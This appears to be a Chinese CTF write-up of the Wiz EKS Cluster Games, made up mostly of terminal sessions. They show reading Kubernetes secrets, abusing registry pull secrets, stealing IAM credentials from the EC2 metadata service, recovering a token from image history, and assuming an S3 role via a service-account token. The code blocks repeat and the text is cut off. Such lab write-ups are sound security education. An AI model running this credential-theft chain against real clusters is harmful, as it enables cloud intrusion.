# 从Wiz Cluster Games 挑战赛漫谈K8s集群安全

> 原文: https://www.ctfiot.com/151534.html
> ID: 151534

前言

Challenge 1

{ "secrets": [ "get", "list" ]}

root@wiz-eks-challenge:~# kubectl get secretsNAME TYPE DATA AGElog-rotate Opaque 1 26h
root@wiz-eks-challenge:~# kubectl get secrets log-rotate -o json{ "apiVersion": "v1", "data": { "flag": "d2l6X[...]NzfQ==" }, "kind": "Secret", "metadata": { "creationTimestamp": "2023-11-01T13:02:08Z", "name": "log-rotate", "namespace": "challenge1", "resourceVersion": "890951", "uid": "03f6372c-b728-4c5b-ad28-70d5af8d387c" }, "type": "Opaque"}

Challenge 2

{ "secrets": [ "get" ], "pods": [ "list", "get" ]}

root@wiz-eks-challenge:~# kubectl get podsNAME READY STATUS RESTARTS AGEdatabase-pod-2c9b3a4e 1/1 Running 0 26hroot@wiz-eks-challenge:~# kubectl get pod database-pod-2c9b3a4e -o yamlapiVersion: v1kind: Podmetadata: name: database-pod-2c9b3a4e namespace: challenge2 [...]spec: containers: - image: eksclustergames/base_ext_image [...] [...] imagePullSecrets: - name: registry-pull-secrets-780bab1d [...]status: [...]

root@wiz-eks-challenge:~# kubectl get secrets registry-pull-secrets-780bab1d -o json{ "apiVersion": "v1", "data": { ".dockerconfigjson": "eyJhdXR[...]RGJ3PT0ifX19" }, "kind": "Secret", "metadata": { "annotations": { "pulumi.com/autonamed": "true" }, "creationTimestamp": "2023-11-01T13:31:29Z", "name": "registry-pull-secrets-780bab1d", "namespace": "challenge2", "resourceVersion": "897340", "uid": "1348531e-57ff-42df-b074-d9ecd566e18b" }, "type": "kubernetes.io/dockerconfigjson"

# Log in to reg.example.comcrane auth login reg.example.com -u AzureDiamond -p hunter2

root@wiz-eks-challenge:~# crane auth login index.docker.io -u eksclustergames -p dckr_pat_Ytn[...]8FuCo2023/11/13 03:24:25 logged in via /home/user/.docker/config.json

root@wiz-eks-challenge:~# crane pull eksclustergames/base_ext_image /tmp/image.tarroot@wiz-eks-challenge:~# cd /tmproot@wiz-eks-challenge:/tmp# tar xvf image.tar sha256:add093cd268deb7817aee1887b620628211a04e8733d22ab5c910f3b6cc918673f4d90098f5b5a6f6a76e9d217da85aa39b2081e30fa1f7d287138d6e7bf0ad7.tar.gz193bf7018861e9ee50a4dc330ec5305abeade134d33d27a78ece55bf4c779e06.tar.gzmanifest.json

root@wiz-eks-challenge:/tmp# tar tvf 193bf7018861e9ee50a4dc330ec5305abeade134d33d27a78ece55bf4c779e06.tar.gzdrwxr-xr-x 0/0 0 2023-11-01 13:32 etc/-rw-r--r-- 0/0 124 2023-11-01 13:32 flag.txtdrwxr-xr-x 0/0 0 2023-11-01 13:32 proc/-rwxr-xr-x 0/0 0 1970-01-01 00:00 proc/.wh..wh..opqdrwxr-xr-x 0/0 0 2023-11-01 13:32 sys/-rwxr-xr-x 0/0 0 1970-01-01 00:00 sys/.wh..wh..opq
root@wiz-eks-challenge:~# cat flag.txt wiz_eks_challenge{xxxxxx}

kubectl create secret docker-registry regcred --docker-server=<your-registry-server> --docker-username=<your-name> --docker-password=<your-pword> --docker-email=<your-email>

Challenge 3

{ "pods": [ "list", "get" ]}

root@wiz-eks-challenge:~# kubectl get podsNAME READY STATUS RESTARTS AGEaccounting-pod-876647f8 1/1 Running 0 11droot@wiz-eks-challenge:~# kubectl get pods accounting-pod-876647f8 -o json{ "apiVersion": "v1", "kind": "Pod", "metadata": { "annotations": { "kubernetes.io/psp": "eks.privileged", "pulumi.com/autonamed": "true" }, "creationTimestamp": "2023-11-01T13:32:10Z", "name": "accounting-pod-876647f8", "namespace": "challenge3", "resourceVersion": "897513", "uid": "dd2256ae-26ca-4b94-a4bf-4ac1768a54e2" }, "spec": { "containers": [ { "image": "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01", "imagePullPolicy": "IfNotPresent", [...] [...]

root@wiz-eks-challenge:~# crane pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c /tmp/image2.tarError: GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/latest: unexpected status code 401 Unauthorized: Not Authorized

root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-dataami-idami-launch-indexami-manifest-pathautoscaling/block-device-mapping/events/hostnameiam/identity-credentials/instance-actioninstance-idinstance-life-cycleinstance-typelocal-hostnamelocal-ipv4macmetrics/network/placement/profilepublic-hostnamepublic-ipv4reservation-idsecurity-groupsservices/system

root@wiz-eks-challenge:~# curl -s 169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole | jq .{ "AccessKeyId": "ASIA2[...]E", "Expiration": "2023-11-02 15:46:13+00:00", "SecretAccessKey": "zcoLW[...]Ds", "SessionToken": "FwoG[...]"}

aws ecr get-login-password --region region | docker login --username AWS --password-stdin 688655246681.dkr.ecr.region.amazonaws.co

$ aws ecr describe-repositories/home/lucass/.local/lib/python3.6/site-packages/requests/__init__.py:104: RequestsDependencyWarning: urllib3 (1.26.9) or chardet (5.0.0)/charset_normalizer (2.0.12) doesn't match a supported version! RequestsDependencyWarning){ "repositories": [ { "repositoryArn": "arn:aws:ecr:us-west-1:688655246681:repository/testos", "registryId": "688655246681", "repositoryName": "testos", "repositoryUri": "688655246681.dkr.ecr.us-west-1.amazonaws.com/testos", "createdAt": 1698601920.0, "imageTagMutability": "MUTABLE", "imageScanningConfiguration": { "scanOnPush": false } }, { "repositoryArn": "arn:aws:ecr:us-west-1:688655246681:repository/central_repo-aaf4a7c", "registryId": "688655246681", "repositoryName": "central_repo-aaf4a7c", "repositoryUri": "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c", "createdAt": 1698845487.0, "imageTagMutability": "MUTABLE", "imageScanningConfiguration": { "scanOnPush": false } } ]}

$ aws ecr describe-images --repository-name central_repo-aaf4a7c/home/lucass/.local/lib/python3.6/site-packages/requests/__init__.py:104: RequestsDependencyWarning: urllib3 (1.26.9) or chardet (5.0.0)/charset_normalizer (2.0.12) doesn't match a supported version! RequestsDependencyWarning){ "imageDetails": [ { "registryId": "688655246681", "repositoryName": "central_repo-aaf4a7c", "imageDigest": "sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01", "imageTags": [ "374f28d8-container" ], "imageSizeInBytes": 2221349, "imagePushedAt": 1698845529.0 } ]}

~$ sudo docker pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container374f28d8-container: Pulling from central_repo-aaf4a7cDigest: sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01Status: Image is up to date for 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container

~$ sudo docker history 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-containerIMAGE CREATED CREATED BY SIZE COMMENT575a75bed1bd 11 days ago CMD ["/bin/sleep" "3133337"] 0B buildkit.dockerfile.v0<missing> 11 days ago RUN sh -c #ARTIFACTORY_USERNAME=challenge@ek… 0B buildkit.dockerfile.v0<missing> 3 months ago /bin/sh -c #(nop) CMD ["sh"] 0B <missing> 3 months ago /bin/sh -c #(nop) ADD file:7e9002edaafd4e457… 4.26MB

sudo docker history 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container --no-truncIMAGE CREATED CREATED BY SIZE COMMENTsha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3 11 days ago CMD ["/bin/sleep" "3133337"] 0B buildkit.dockerfile.v0<missing> 11 days ago RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{xxxxxxx} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit 0B buildkit.dockerfile.v0<missing> 3 months ago /bin/sh -c #(nop) CMD ["sh"] 0B <missing> 3 months ago /bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / 4.26MB

root@wiz-eks-challenge:~# aws ecr get-login-password | crane auth login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com2023/11/13 06:52:38 logged in via /home/user/.docker/config.json

root@wiz-eks-challenge:~# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sleep","3133337"],"ArgsEscaped":true,"OnBuild":null},"created":"2023-11-01T13:32:07.782534085Z","history":[{"created":"2023-07-18T23:19:33.538571854Z","created_by":"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "},{"created":"2023-07-18T23:19:33.655005962Z","created_by":"/bin/sh -c #(nop) CMD ["sh"]","empty_layer":true},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{xxxxxxxxxxx} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"CMD ["/bin/sleep" "3133337"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f","sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"]}}

Challenge 4

root@wiz-eks-challenge:~# kubectl whoamisystem:serviceaccount:challenge4:service-account-challenge4
root@wiz-eks-challenge:~# kubectl get podsError from server (Forbidden): pods is forbidden: User "system:serviceaccount:challenge4:service-account-challenge4" cannot list resource "pods" in API group "" in the namespace "challenge4"

root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-data/iam/security-credentialseks-challenge-cluster-nodegroup-NodeInstanceRole
root@wiz-eks-challenge:~# aws sts get-caller-identity{ "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282", "Account": "688655246681", "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"}

root@wiz-eks-challenge:~# aws eks list-clusters
An error occurred (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/*

root@wiz-eks-challenge:~# aws eks describe-cluster --name eks-challenge-cluster
An error occurred (AccessDeniedException) when calling the DescribeCluster operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:DescribeCluster on resource: arn:aws:eks:us-west-1:688655246681:cluster/eks-challenge-cluster

root@wiz-eks-challenge:~# aws eks get-token --cluster-name eks-challenge-cluster{ "kind": "ExecCredential", "apiVersion": "client.authentication.k8s.io/v1beta1", "spec": {}, "status": { "expirationTimestamp": "2023-11-13T07:49:07Z", "token": "k8s-aws-v1.aH[...]ODU5MGU" }

root@wiz-eks-challenge:~# TOKEN=k8s-aws-v1.aH[...]ODU5MGUroot@wiz-eks-challenge:~# kubectl --token "$TOKEN" get secretsNAME TYPE DATA AGEnode-flag Opaque 1 11d
root@wiz-eks-challenge:~# kubectl --token "$TOKEN" get secrets node-flag -o json{ "apiVersion": "v1", "data": { "flag": "d2l6X2Vrc1[...]TURTX3RvX0VLU19jb25ncmF0c30=" }, "kind": "Secret", "metadata": { "creationTimestamp": "2023-11-01T12:27:57Z", "name": "node-flag", "namespace": "challenge4", "resourceVersion": "883574", "uid": "26461a29-ec72-40e1-adc7-99128ce664f7" }, "type": "Opaque"}

aws eks get-token --cluster <cluster_name>

{ "kind": "ExecCredential", "apiVersion": "client.authentication.Kubernetes.io/v1beta1", "spec": {}, "status": { "expirationTimestamp": "2023-11-13T07:49:07Z", "token": "Kubernetes-aws-v1.aH[...]ODU5MGU" }}

Challenge 5

# IAM Policy:{ "Policy": { "Statement": [ { "Action": [ "s3:GetObject", "s3:ListBucket" ], "Effect": "Allow", "Resource": [ "arn:aws:s3:::challenge-flag-bucket-3ff1ae2", "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag" ] } ], "Version": "2012-10-17" }}

# Trust Policy{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": { "Federated": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589" }, "Action": "sts:AssumeRoleWithWebIdentity", "Condition": { "StringEquals": { "oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud": "sts.amazonaws.com" } } } ]}

#Kubernetes权限{ "secrets": [ "get", "list" ], "serviceaccounts": [ "get", "list" ], "pods": [ "get", "list" ], "serviceaccounts/token": [ "create" ]}

root@wiz-eks-challenge:~# kubectl get podsNo resources found in challenge5 namespace.root@wiz-eks-challenge:~# kubectl get secretsNo resources found in challenge5 namespace.root@wiz-eks-challenge:~# kubectl get sa NAME SECRETS AGEdebug-sa 0 12ddefault 0 12ds3access-sa 0 12d

root@wiz-eks-challenge:~# kubectl get sa debug-sa -o json{ "apiVersion": "v1", "kind": "ServiceAccount", "metadata": { "annotations": { "description": "This is a dummy service account with empty policy attached", "eks.amazonaws.com/role-arn": "arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e" }, "creationTimestamp": "2023-10-31T20:07:37Z", "name": "debug-sa", "namespace": "challenge5", "resourceVersion": "671929", "uid": "6cb6024a-c4da-47a9-9050-59c8c7079904" }}root@wiz-eks-challenge:~# kubectl get sa default -o json{ "apiVersion": "v1", "kind": "ServiceAccount", "metadata": { "creationTimestamp": "2023-10-31T20:07:11Z", "name": "default", "namespace": "challenge5", "resourceVersion": "671804", "uid": "77bd3db6-3642-40d5-b8c1-14fa1b0cba8c" }}root@wiz-eks-challenge:~# kubectl get sa s3access-sa -o json{ "apiVersion": "v1", "kind": "ServiceAccount", "metadata": { "annotations": { "eks.amazonaws.com/role-arn": "arn:aws:iam::688655246681:role/challengeEksS3Role" }, "creationTimestamp": "2023-10-31T20:07:34Z", "name": "s3access-sa", "namespace": "challenge5", "resourceVersion": "671916", "uid": "86e44c49-b05a-4ebe-800b-45183a6ebbda" }}

root@wiz-eks-challenge:~# kubectl create token s3access-saerror: failed to create token: serviceaccounts "s3access-sa" is forbidden: User "system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal" cannot create resource "serviceaccounts/token" in API group "" in the namespace "challenge5"
root@wiz-eks-challenge:~# kubectl create token debug-sa eyJhbGci[...]66B-YamXw

aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789012:role/FederatedWebIdentityRole --role-session-name "my-session-name" --web-identity-token file://path-to-token

root@wiz-eks-challenge:~# aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token "$TOKEN"{ "Credentials": { "AccessKeyId": "ASIA2AV[...]KDJQG7L", "SecretAccessKey": "U5JIhuryg[...]60GPuovIkRKmiG3+", "SessionToken": "IQoJb3JpZ2luX2VjEPn//////////wEaCXVzLXdlc3QtMSJHMEUCICMd1Wn8Vp83saPOqeXsifXhposvzCoiZVu5frKLCWjq[...]8ksKhw84=", "Expiration": "2023-11-13T10:07:14+00:00" }, "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa", "AssumedRoleUser": { "AssumedRoleId": "AROA2AVYNEVMZEZ2AFVYI:test", "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test" }, "Provider": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589", "Audience": "sts.amazonaws.com"}

root@wiz-eks-challenge:~# aws sts get-caller-identity{ "UserId": "AROA2AVYNEVMZEZ2AFVYI:test", "Account": "688655246681", "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"}
root@wiz-eks-challenge:~# aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag .download: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag
root@wiz-eks-challenge:~# cat flagwiz_eks_challenge{xxxxx}

集群安全最佳实践

总结

参考文章


```
{ "secrets": [ "get", "list" ]}
```



```
root@wiz-eks-challenge:~# kubectl get secretsNAME TYPE DATA AGElog-rotate Opaque 1 26h
root@wiz-eks-challenge:~# kubectl get secrets log-rotate -o json{ "apiVersion": "v1", "data": { "flag": "d2l6X[...]NzfQ==" }, "kind": "Secret", "metadata": { "creationTimestamp": "2023-11-01T13:02:08Z", "name": "log-rotate", "namespace": "challenge1", "resourceVersion": "890951", "uid": "03f6372c-b728-4c5b-ad28-70d5af8d387c" }, "type": "Opaque"}
```



```
{ "secrets": [ "get" ], "pods": [ "list", "get" ]}
```



```
root@wiz-eks-challenge:~# kubectl get podsNAME READY STATUS RESTARTS AGEdatabase-pod-2c9b3a4e 1/1 Running 0 26hroot@wiz-eks-challenge:~# kubectl get pod database-pod-2c9b3a4e -o yamlapiVersion: v1kind: Podmetadata: name: database-pod-2c9b3a4e namespace: challenge2 [...]spec: containers: - image: eksclustergames/base_ext_image [...] [...] imagePullSecrets: - name: registry-pull-secrets-780bab1d [...]status: [...]
```



```
root@wiz-eks-challenge:~# kubectl get secrets registry-pull-secrets-780bab1d -o json{ "apiVersion": "v1", "data": { ".dockerconfigjson": "eyJhdXR[...]RGJ3PT0ifX19" }, "kind": "Secret", "metadata": { "annotations": { "pulumi.com/autonamed": "true" }, "creationTimestamp": "2023-11-01T13:31:29Z", "name": "registry-pull-secrets-780bab1d", "namespace": "challenge2", "resourceVersion": "897340", "uid": "1348531e-57ff-42df-b074-d9ecd566e18b" }, "type": "kubernetes.io/dockerconfigjson"
```



```
# Log in to reg.example.comcrane auth login reg.example.com -u AzureDiamond -p hunter2
```



```
root@wiz-eks-challenge:~# crane auth login index.docker.io -u eksclustergames -p dckr_pat_Ytn[...]8FuCo2023/11/13 03:24:25 logged in via /home/user/.docker/config.json
```



```
root@wiz-eks-challenge:~# crane pull eksclustergames/base_ext_image /tmp/image.tarroot@wiz-eks-challenge:~# cd /tmproot@wiz-eks-challenge:/tmp# tar xvf image.tar sha256:add093cd268deb7817aee1887b620628211a04e8733d22ab5c910f3b6cc918673f4d90098f5b5a6f6a76e9d217da85aa39b2081e30fa1f7d287138d6e7bf0ad7.tar.gz193bf7018861e9ee50a4dc330ec5305abeade134d33d27a78ece55bf4c779e06.tar.gzmanifest.json
```



```
root@wiz-eks-challenge:/tmp# tar tvf 193bf7018861e9ee50a4dc330ec5305abeade134d33d27a78ece55bf4c779e06.tar.gzdrwxr-xr-x 0/0 0 2023-11-01 13:32 etc/-rw-r--r-- 0/0 124 2023-11-01 13:32 flag.txtdrwxr-xr-x 0/0 0 2023-11-01 13:32 proc/-rwxr-xr-x 0/0 0 1970-01-01 00:00 proc/.wh..wh..opqdrwxr-xr-x 0/0 0 2023-11-01 13:32 sys/-rwxr-xr-x 0/0 0 1970-01-01 00:00 sys/.wh..wh..opq
root@wiz-eks-challenge:~# cat flag.txt wiz_eks_challenge{xxxxxx}
```



```
kubectl create secret docker-registry regcred --docker-server=<your-registry-server> --docker-username=<your-name> --docker-password=<your-pword> --docker-email=<your-email>
```



```
{ "pods": [ "list", "get" ]}
```



```
root@wiz-eks-challenge:~# kubectl get podsNAME READY STATUS RESTARTS AGEaccounting-pod-876647f8 1/1 Running 0 11droot@wiz-eks-challenge:~# kubectl get pods accounting-pod-876647f8 -o json{ "apiVersion": "v1", "kind": "Pod", "metadata": { "annotations": { "kubernetes.io/psp": "eks.privileged", "pulumi.com/autonamed": "true" }, "creationTimestamp": "2023-11-01T13:32:10Z", "name": "accounting-pod-876647f8", "namespace": "challenge3", "resourceVersion": "897513", "uid": "dd2256ae-26ca-4b94-a4bf-4ac1768a54e2" }, "spec": { "containers": [ { "image": "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01", "imagePullPolicy": "IfNotPresent", [...] [...]
```



```
root@wiz-eks-challenge:~# crane pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c /tmp/image2.tarError: GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/latest: unexpected status code 401 Unauthorized: Not Authorized
```



```
root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-dataami-idami-launch-indexami-manifest-pathautoscaling/block-device-mapping/events/hostnameiam/identity-credentials/instance-actioninstance-idinstance-life-cycleinstance-typelocal-hostnamelocal-ipv4macmetrics/network/placement/profilepublic-hostnamepublic-ipv4reservation-idsecurity-groupsservices/system
```



```
root@wiz-eks-challenge:~# curl -s 169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole | jq .{ "AccessKeyId": "ASIA2[...]E", "Expiration": "2023-11-02 15:46:13+00:00", "SecretAccessKey": "zcoLW[...]Ds", "SessionToken": "FwoG[...]"}
```



```
aws ecr get-login-password --region region | docker login --username AWS --password-stdin 688655246681.dkr.ecr.region.amazonaws.co
```



```
$ aws ecr describe-repositories/home/lucass/.local/lib/python3.6/site-packages/requests/__init__.py:104: RequestsDependencyWarning: urllib3 (1.26.9) or chardet (5.0.0)/charset_normalizer (2.0.12) doesn't match a supported version! RequestsDependencyWarning){ "repositories": [ { "repositoryArn": "arn:aws:ecr:us-west-1:688655246681:repository/testos", "registryId": "688655246681", "repositoryName": "testos", "repositoryUri": "688655246681.dkr.ecr.us-west-1.amazonaws.com/testos", "createdAt": 1698601920.0, "imageTagMutability": "MUTABLE", "imageScanningConfiguration": { "scanOnPush": false } }, { "repositoryArn": "arn:aws:ecr:us-west-1:688655246681:repository/central_repo-aaf4a7c", "registryId": "688655246681", "repositoryName": "central_repo-aaf4a7c", "repositoryUri": "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c", "createdAt": 1698845487.0, "imageTagMutability": "MUTABLE", "imageScanningConfiguration": { "scanOnPush": false } } ]}

$ aws ecr describe-images --repository-name central_repo-aaf4a7c/home/lucass/.local/lib/python3.6/site-packages/requests/__init__.py:104: RequestsDependencyWarning: urllib3 (1.26.9) or chardet (5.0.0)/charset_normalizer (2.0.12) doesn't match a supported version! RequestsDependencyWarning){ "imageDetails": [ { "registryId": "688655246681", "repositoryName": "central_repo-aaf4a7c", "imageDigest": "sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01", "imageTags": [ "374f28d8-container" ], "imageSizeInBytes": 2221349, "imagePushedAt": 1698845529.0 } ]}
```



```
~$ sudo docker pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container374f28d8-container: Pulling from central_repo-aaf4a7cDigest: sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01Status: Image is up to date for 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container
```



```
~$ sudo docker history 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-containerIMAGE CREATED CREATED BY SIZE COMMENT575a75bed1bd 11 days ago CMD ["/bin/sleep" "3133337"] 0B buildkit.dockerfile.v0<missing> 11 days ago RUN sh -c #ARTIFACTORY_USERNAME=challenge@ek… 0B buildkit.dockerfile.v0<missing> 3 months ago /bin/sh -c #(nop) CMD ["sh"] 0B <missing> 3 months ago /bin/sh -c #(nop) ADD file:7e9002edaafd4e457… 4.26MB
```



```
sudo docker history 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container --no-truncIMAGE CREATED CREATED BY SIZE COMMENTsha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3 11 days ago CMD ["/bin/sleep" "3133337"] 0B buildkit.dockerfile.v0<missing> 11 days ago RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{xxxxxxx} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit 0B buildkit.dockerfile.v0<missing> 3 months ago /bin/sh -c #(nop) CMD ["sh"] 0B <missing> 3 months ago /bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / 4.26MB
```



```
root@wiz-eks-challenge:~# aws ecr get-login-password | crane auth login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com2023/11/13 06:52:38 logged in via /home/user/.docker/config.json
```



```
root@wiz-eks-challenge:~# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sleep","3133337"],"ArgsEscaped":true,"OnBuild":null},"created":"2023-11-01T13:32:07.782534085Z","history":[{"created":"2023-07-18T23:19:33.538571854Z","created_by":"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "},{"created":"2023-07-18T23:19:33.655005962Z","created_by":"/bin/sh -c #(nop) CMD ["sh"]","empty_layer":true},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{xxxxxxxxxxx} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"CMD ["/bin/sleep" "3133337"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f","sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"]}}
```



```
root@wiz-eks-challenge:~# kubectl whoamisystem:serviceaccount:challenge4:service-account-challenge4
root@wiz-eks-challenge:~# kubectl get podsError from server (Forbidden): pods is forbidden: User "system:serviceaccount:challenge4:service-account-challenge4" cannot list resource "pods" in API group "" in the namespace "challenge4"
```



```
root@wiz-eks-challenge:~# curl 169.254.169.254/latest/meta-data/iam/security-credentialseks-challenge-cluster-nodegroup-NodeInstanceRole
root@wiz-eks-challenge:~# aws sts get-caller-identity{ "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282", "Account": "688655246681", "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"}
```



```
root@wiz-eks-challenge:~# aws eks list-clusters
An error occurred (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/*
```



```
root@wiz-eks-challenge:~# aws eks describe-cluster --name eks-challenge-cluster
An error occurred (AccessDeniedException) when calling the DescribeCluster operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:DescribeCluster on resource: arn:aws:eks:us-west-1:688655246681:cluster/eks-challenge-cluster
```



```
root@wiz-eks-challenge:~# aws eks get-token --cluster-name eks-challenge-cluster{ "kind": "ExecCredential", "apiVersion": "client.authentication.k8s.io/v1beta1", "spec": {}, "status": { "expirationTimestamp": "2023-11-13T07:49:07Z", "token": "k8s-aws-v1.aH[...]ODU5MGU" }
```



```
root@wiz-eks-challenge:~# TOKEN=k8s-aws-v1.aH[...]ODU5MGUroot@wiz-eks-challenge:~# kubectl --token "$TOKEN" get secretsNAME TYPE DATA AGEnode-flag Opaque 1 11d
root@wiz-eks-challenge:~# kubectl --token "$TOKEN" get secrets node-flag -o json{ "apiVersion": "v1", "data": { "flag": "d2l6X2Vrc1[...]TURTX3RvX0VLU19jb25ncmF0c30=" }, "kind": "Secret", "metadata": { "creationTimestamp": "2023-11-01T12:27:57Z", "name": "node-flag", "namespace": "challenge4", "resourceVersion": "883574", "uid": "26461a29-ec72-40e1-adc7-99128ce664f7" }, "type": "Opaque"}
```



```
